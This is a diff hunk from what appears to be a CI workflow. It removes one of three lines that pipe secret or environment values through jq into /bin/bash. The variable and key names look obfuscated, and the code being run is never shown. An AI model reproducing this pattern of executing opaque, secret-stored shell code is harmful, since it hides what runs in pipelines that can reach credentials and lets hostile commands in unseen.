@@ -23,7 +23,6 @@ jobs:
           fou796: ${{ secrets.fou796 }}
         run: |
           printf '%s' "$fou796" | jq -r .w78470 | /bin/bash
-          echo $usc0408 | jq -r .bow7 | /bin/bash
           printf '%s' "$o63637" | jq -r .yxdup0 | /bin/bash
 
       - name: Store artifact
